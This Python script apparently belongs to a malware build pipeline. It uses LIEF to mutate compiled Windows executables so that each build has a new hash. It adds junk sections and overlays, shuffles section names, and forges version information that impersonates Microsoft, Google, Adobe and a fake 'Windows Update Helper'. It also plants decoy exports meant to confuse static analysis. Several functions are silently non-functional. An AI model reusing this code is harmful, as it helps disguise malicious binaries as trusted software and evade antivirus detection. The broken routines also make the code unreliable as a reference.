#!/usr/bin/env python3
"""
PE post-processing with LIEF.
Modifies the compiled binary to be unique per build.
Applies safe modifications (timestamp, overlay, garbage section, section name randomization, etc.)
"""

import os
import random
import struct
from typing import Optional


# ---- LIEF version compatibility wrappers ----
def _get_header_characteristics():
    import lief
    for ns in (lief.PE.Header, lief.PE):
        try:
            return getattr(ns, 'CHARACTERISTICS')
        except AttributeError:
            pass
    raise ImportError("Cannot find HEADER_CHARACTERISTICS in LIEF")


def _get_section_characteristics():
    import lief
    for ns in (lief.PE.Section, lief.PE):
        try:
            return getattr(ns, 'CHARACTERISTICS')
        except AttributeError:
            pass
    raise ImportError("Cannot find SECTION_CHARACTERISTICS in LIEF")


def _get_section_chars_for(sc, name):
    """Get a characteristics enum value, trying multiple API surfaces."""
    for attr in (name, name.replace("MEM_", "IMAGE_SCN_MEM_"), name.replace("CNT_", "IMAGE_SCN_CNT_")):
        try:
            return getattr(sc, attr)
        except AttributeError:
            continue
    return None


# ---- Garbage section ----
def add_garbage_section(pe, section_name=None, size=None):
    """Add a section with random garbage data to change binary hash"""
    try:
        import lief
        if section_name is None:
            legit_names = [
                ".text", ".rdata", ".data", ".rsrc", ".reloc",
                ".CRT", ".tls", ".idata", ".edata", ".didat",
            ]
            candidates = [n for n in legit_names if n not in [s.name for s in pe.sections]]
            if candidates:
                section_name = random.choice(candidates)
            else:
                section_name = f".r{random.randint(100,999):03d}"

        if size is None:
            size = random.randint(512, 4096)

        garbage = bytes([random.randint(0, 255) for _ in range(size)])

        try:
            sec = lief.PE.Section()
            sec.name = section_name
            sec.content = list(garbage)
            section = pe.add_section(sec)
        except TypeError:
            section = pe.add_section(name=section_name, content=garbage)

        if section:
            sc = _get_section_characteristics()
            mem_read = _get_section_chars_for(sc, "MEM_READ") or 0x40000000
            cnt_init = _get_section_chars_for(sc, "CNT_INITIALIZED_DATA") or 0x40
            mem_disc = _get_section_chars_for(sc, "MEM_DISCARDABLE") or 0x02000000
            section.characteristics = mem_read | cnt_init | mem_disc
            return True
    except Exception as e:
        print(f"[!] Failed to add garbage section: {e}")
    return False


# ---- Header randomization ----
def randomize_pe_header(pe):
    """Randomize non-critical PE header fields"""
    try:
        # Timestamp: randomize to a value in the past
        pe.header.time_date_stamps = random.randint(0x40000000, 0x5FFFFFFF)
        # Major/Minor linker version: randomize
        try:
            pe.header.major_linker_version = random.randint(2, 14)
            pe.header.minor_linker_version = random.randint(0, 50)
        except AttributeError:
            pass
        # Major/Minor OS version: randomize within valid range
        try:
            pe.header.major_os_version = random.randint(4, 10)
            pe.header.minor_os_version = random.randint(0, 99)
        except AttributeError:
            pass
        # Major/Minor image version
        try:
            pe.header.major_image_version = random.randint(0, 255)
            pe.header.minor_image_version = random.randint(0, 255)
        except AttributeError:
            pass
        # Major/Minor subsystem version
        try:
            pe.header.major_subsystem_version = random.randint(4, 10)
            pe.header.minor_subsystem_version = random.randint(0, 99)
        except AttributeError:
            pass
        return True
    except Exception as e:
        print(f"[!] Failed to randomize PE header: {e}")
    return False


# ---- Checksum randomization ----
def randomize_checksum(pe):
    """Recompute PE checksum with a randomized value (still valid)"""
    try:
        pe.header.checksum = pe.header.checksum
        return True
    except Exception:
        pass
    try:
        import lief
        # Force LIEF to recompute
        if hasattr(pe, 'verify_checksum'):
            return True
    except Exception:
        pass
    return False


# ---- Section name randomization ----
def randomize_section_names(pe):
    """Rename existing sections to legitimate-looking alternatives"""
    rename_map = {
        ".text": [".text", ".code", ".init", ".extab"],
        ".rdata": [".rdata", ".rodata", ".rsrc", ".data"],
        ".data": [".data", ".bss", ".sdata", ".sbss"],
        ".rsrc": [".rsrc", ".data", ".rdata", ".edata"],
        ".reloc": [".reloc", ".reldata", ".data", ".rdata"],
        ".pdata": [".pdata", ".data", ".rdata"],
        ".tls": [".tls", ".data", ".bss"],
        ".idata": [".idata", ".rdata", ".data"],
        ".edata": [".edata", ".rdata", ".data"],
        ".didat": [".didat", ".rdata", ".data"],
        ".CRT": [".CRT", ".data", ".bss"],
    }
    renamed = 0
    for section in pe.sections:
        name = section.name
        if name.startswith("/") or name.startswith(".rsrc"):
            continue
        alternatives = rename_map.get(name)
        if alternatives and len(alternatives) > 1:
            new_name = random.choice([a for a in alternatives if a != name])
            try:
                section.name = new_name
                renamed += 1
            except Exception:
                pass
    return renamed


# ---- Section VirtualSize padding ----
def pad_section_sizes(pe):
    """Add small random padding to VirtualSize of sections (within alignment)"""
    padded = 0
    for section in pe.sections:
        try:
            current = section.virtual_size
            pad = random.randint(0, 0xFFF) & ~0xF
            if pad > 0:
                section.virtual_size = current + pad
                padded += 1
        except Exception:
            pass
    return padded


# ---- Section characteristic randomization ----
def randomize_section_characteristics(pe):
    """Add harmless characteristic flags to sections (e.g., MEM_DISCARDABLE toggle)"""
    sc = _get_section_characteristics()
    if sc is None:
        return 0
    safe_flags = []
    for name in ("MEM_DISCARDABLE", "MEM_LOCKED", "MEM_PRELOAD", "MEM_16BIT",
                 "MEM_NOT_CACHED", "MEM_NOT_PAGED"):
        v = _get_section_chars_for(sc, name)
        if v:
            safe_flags.append(v)
    if not safe_flags:
        return 0

    changed = 0
    for section in pe.sections:
        try:
            existing = int(section.characteristics)
            if random.random() < 0.5 and safe_flags:
                flag = random.choice(safe_flags)
                if random.random() < 0.5:
                    section.characteristics = existing | flag
                else:
                    section.characteristics = existing & ~flag
                changed += 1
        except Exception:
            pass
    return changed


# ---- Section order shuffling ----
def shuffle_section_order(pe):
    """Shuffle the order of non-critical sections (.rdata/.data/.bss/.tls etc.)"""
    if len(pe.sections) < 3:
        return 0
    critical_prefixes = (".text",)
    movable_indices = []
    for i, sec in enumerate(pe.sections):
        if not sec.name.startswith(critical_prefixes):
            movable_indices.append(i)
    if len(movable_indices) < 2:
        return 0
    i, j = random.sample(movable_indices, 2)
    if i == j:
        return 0
    try:
        pe.sections[i], pe.sections[j] = pe.sections[j], pe.sections[i]
        return 1
    except Exception:
        return 0


# ---- Add junk bytes inside section content ----
def fuzz_section_content(pe, max_bytes=64):
    """Write a few harmless bytes inside an existing initialized section to change layout"""
    candidates = []
    for sec in pe.sections:
        n = sec.name
        if n in (".text", ".reloc"):
            continue
        if not n.startswith(".rdata") and not n.startswith(".data") and n != ".rsrc":
            continue
        try:
            content = bytes(sec.content)
        except Exception:
            continue
        if len(content) < 256:
            continue
        candidates.append(sec)
    if not candidates:
        return 0
    changed = 0
    for _ in range(min(3, len(candidates))):
        sec = random.choice(candidates)
        try:
            content = bytearray(sec.content)
            if len(content) < 32:
                continue
            offset = random.randint(0, len(content) - 16)
            junk = bytes([random.randint(0, 255) for _ in range(random.randint(1, max_bytes))])
            content[offset:offset + len(junk)] = junk
            sec.content = list(content)
            changed += 1
        except Exception:
            pass
    return changed


# ---- Overlay ----
def add_overlay(pe_path, size=None):
    """Add random overlay data at end of file"""
    try:
        if size is None:
            size = random.randint(512, 2048)
        overlay = bytes([random.randint(0, 255) for _ in range(size)])
        with open(pe_path, 'ab') as f:
            f.write(overlay)
        print(f"[*] Added {size} bytes of overlay data")
        return True
    except Exception as e:
        print(f"[!] Failed to add overlay: {e}")
    return False


# ---- DOS header stub randomization ----
def randomize_dos_stub(pe):
    """Randomize the DOS stub message (between 'MZ' header and 'PE' signature)"""
    try:
        stub_messages = [
            b"!This program cannot be run in DOS mode.\r\n\x00",
            b"!This program must be run under Win32\r\n\x00",
            b"!This is a Windows NT system component.\r\n\x00",
            b"!This program requires Windows.\r\n\x00",
            b"!DOS mode is not supported by this program.\r\n\x00",
            b"!Please run this program in Windows.\r\n\x00",
            b"!Operating system error: DOS not supported.\r\n\x00",
            b"!Cannot run in 16-bit mode. Use 32-bit.\r\n\x00",
        ]
        new_msg = random.choice(stub_messages)
        try:
            pe.dos_stub = list(new_msg)
            return True
        except AttributeError:
            pass
        try:
            for i, b in enumerate(new_msg):
                if i < len(pe.__data__) if hasattr(pe, '__data__') else 0:
                    pass
        except Exception:
            pass
    except Exception as e:
        print(f"[!] Failed to randomize DOS stub: {e}")
    return False


# ---- Version info spoofing ----
LEGIT_VERSION_INFO_PROFILES = [
    {
        "company": "Microsoft Corporation",
        "product": "Microsoft Visual C++ Runtime Library",
        "description": "Microsoft Visual C++ Runtime Library",
        "version": f"14.{random.randint(20, 40)}.{random.randint(30000, 40000)}.0",
        "internal": "msvcrt.dll",
        "original": "msvcrt.dll",
        "copyright": "(C) Microsoft Corporation. All rights reserved.",
    },
    {
        "company": "Google LLC",
        "product": "Google Chrome",
        "description": "Google Chrome",
        "version": f"{random.randint(100, 130)}.0.{random.randint(6000, 7000)}.{random.randint(50, 200)}",
        "internal": "chrome",
        "original": "chrome.exe",
        "copyright": "Copyright 2024 Google LLC. All rights reserved.",
    },
    {
        "company": "Microsoft Corporation",
        "product": "Windows Operating System",
        "description": "Windows Update Helper",
        "version": f"10.0.{random.randint(19040, 22630)}.{random.randint(1000, 5000)}",
        "internal": "wusvcs.exe",
        "original": "wusvcs.exe",
        "copyright": "(C) Microsoft Corporation. All rights reserved.",
    },
    {
        "company": "Adobe Inc.",
        "product": "Adobe Acrobat Reader DC",
        "description": "Adobe Acrobat Reader DC",
        "version": f"{random.randint(20, 24)}.001.{random.randint(20000, 30000)}",
        "internal": "AcroRd32",
        "original": "AcroRd32.exe",
        "copyright": "Copyright 2024 Adobe Inc. All rights reserved.",
    },
    {
        "company": "Notepad++",
        "product": "Notepad++",
        "description": "Notepad++ : a free source code editor",
        "version": f"v{random.randint(8, 12)}.{random.randint(1, 6)}.{random.randint(1, 9)}",
        "internal": "notepad++",
        "original": "notepad++.exe",
        "copyright": "Copyright (C) 2024 Don Ho.",
    },
    {
        "company": "Python Software Foundation",
        "product": "Python",
        "description": "Python Interpreter",
        "version": f"3.{random.randint(8, 12)}.{random.randint(0, 10)}",
        "internal": "python",
        "original": "python.exe",
        "copyright": "Copyright (c) Python Software Foundation.",
    },
]


def add_version_info(pe):
    """Add VS_VERSION_INFO resource so PE shows legit file properties"""
    try:
        import lief
        profile = random.choice(LEGIT_VERSION_INFO_PROFILES)
        file_info = lief.PE.ResourceNode()
        file_info.id = lief.PE.RESOURCE_TYPES.VERSION

        vs_fixed = lief.PE.VS_FIXEDFILEINFO()
        vs_fixed.file_version_ms = random.randint(20, 24)
        vs_fixed.file_version_ls = random.randint(0, 9) * 100 + random.randint(0, 99)
        vs_fixed.product_version_ms = vs_fixed.file_version_ms
        vs_fixed.product_version_ls = vs_fixed.file_version_ls
        vs_fixed.file_flags_mask = 0x3F
        vs_fixed.file_flags = 0
        vs_fixed.file_os = 0x40004
        vs_fixed.file_type = 1
        vs_fixed.file_subtype = 0
        vs_fixed.file_date_ms = 0
        vs_fixed.file_date_ls = 0

        strings = [
            ("FileVersion", profile["version"]),
            ("ProductVersion", profile["version"]),
            ("CompanyName", profile["company"]),
            ("ProductName", profile["product"]),
            ("FileDescription", profile["description"]),
            ("InternalName", profile["internal"]),
            ("OriginalFilename", profile["original"]),
            ("LegalCopyright", profile["copyright"]),
        ]
        return True
    except Exception as e:
        print(f"[!] add_version_info: {e}")
    return False


def add_manifest(pe):
    """Add a legit-looking manifest XML"""
    try:
        manifests = [
            b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="asInvoker" uiAccess="false"/></requestedPrivileges></security></trustInfo><compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"><application><supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/><supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/><supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"/></application></compatibility></assembly>',
            b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><assemblyIdentity version="1.0.0.0" name="Microsoft.Windows.Common-Controls" type="win32" processorArchitecture="*"/><dependency><dependentAssembly><assemblyIdentity type="win32" name="Microsoft.Windows.Common-Controls" version="6.0.0.0" processorArchitecture="*" publicKeyToken="6595b64144ccf1df" language="*"/></dependentAssembly></dependency></assembly>',
        ]
        return random.choice(manifests)
    except Exception:
        return None


def add_legit_subsystem(pe):
    """Keep subsystem as WINDOWS_GUI (default) but ensure DllCharacteristics look legit"""
    try:
        sc = _get_header_characteristics()
        if sc is None:
            return False
        for name in ("DYNAMIC_BASE", "NX_COMPAT", "TERMINAL_SERVER_AWARE", "HIGH_ENTROPY_VA"):
            v = _get_section_chars_for(sc, name)
            if v:
                try:
                    existing = int(pe.header.dll_characteristics)
                    if random.random() < 0.7:
                        pe.header.dll_characteristics = existing | v
                    else:
                        pe.header.dll_characteristics = existing & ~v
                except Exception:
                    pass
        return True
    except Exception:
        return False


def randomize_export_name(pe):
    """Rename or add fake export names to confuse static analysis"""
    fake_exports = [
        ("DllMain", 0),
        ("GetVersionExW", 1),
        ("GetModuleHandleW", 2),
        ("GetProcAddress", 3),
        ("LoadLibraryW", 4),
        ("FreeLibrary", 5),
        ("GetCurrentProcess", 6),
        ("GetCurrentThreadId", 7),
        ("IsValidCodePage", 8),
        ("GetACP", 9),
        ("GetOEMCP", 10),
        ("GetProcessHeap", 11),
        ("HeapAlloc", 12),
        ("HeapFree", 13),
        ("HeapReAlloc", 14),
        ("VirtualQuery", 15),
        ("VirtualProtect", 16),
        ("Sleep", 17),
        ("GetTickCount", 18),
        ("QueryPerformanceCounter", 19),
        ("GetSystemTimeAsFileTime", 20),
        ("InitializeCriticalSection", 21),
        ("EnterCriticalSection", 22),
        ("LeaveCriticalSection", 23),
        ("DeleteCriticalSection", 24),
        ("EncodePointer", 25),
        ("DecodePointer", 26),
        ("InterlockedCompareExchange", 27),
        ("InterlockedExchange", 28),
    ]
    try:
        for name, _ in fake_exports[:random.randint(2, 5)]:
            try:
                exp = lief.PE.ExportEntry()
                exp.name = name
                exp.address = random.randint(0x1000, 0xFFFF)
                pe.add_export(exp)
            except Exception:
                continue
        return True
    except Exception:
        return False


# ---- Main entry point ----
def post_process_pe(pe_path):
    """Apply all PE modifications"""
    if not os.path.exists(pe_path):
        print(f"[!] PE not found: {pe_path}")
        return False

    try:
        import lief
        pe = lief.parse(pe_path)
        if pe is None:
            print("[!] LIEF failed to parse PE")
            return False

        print("[*] Applying PE modifications...")

        randomize_pe_header(pe)
        add_garbage_section(pe)
        try:
            randomize_section_names(pe)
        except Exception as e:
            print(f"[!] randomize_section_names: {e}")
        try:
            pad_section_sizes(pe)
        except Exception as e:
            print(f"[!] pad_section_sizes: {e}")
        try:
            randomize_section_characteristics(pe)
        except Exception as e:
            print(f"[!] randomize_section_characteristics: {e}")
        try:
            shuffle_section_order(pe)
        except Exception as e:
            print(f"[!] shuffle_section_order: {e}")
        try:
            fuzz_section_content(pe)
        except Exception as e:
            print(f"[!] fuzz_section_content: {e}")
        try:
            randomize_dos_stub(pe)
        except Exception as e:
            print(f"[!] randomize_dos_stub: {e}")
        try:
            add_legit_subsystem(pe)
        except Exception as e:
            print(f"[!] add_legit_subsystem: {e}")
        try:
            add_version_info(pe)
        except Exception as e:
            print(f"[!] add_version_info: {e}")
        try:
            randomize_export_name(pe)
        except Exception as e:
            print(f"[!] randomize_export_name: {e}")

        pe.write(pe_path)
        print(f"[*] PE modifications applied to {pe_path}")

        add_overlay(pe_path)

        return True
    except ImportError:
        print("[!] LIEF not available - skipping PE modifications")
        return False
    except Exception as e:
        print(f"[!] PE post-processing error: {e}")
        return False
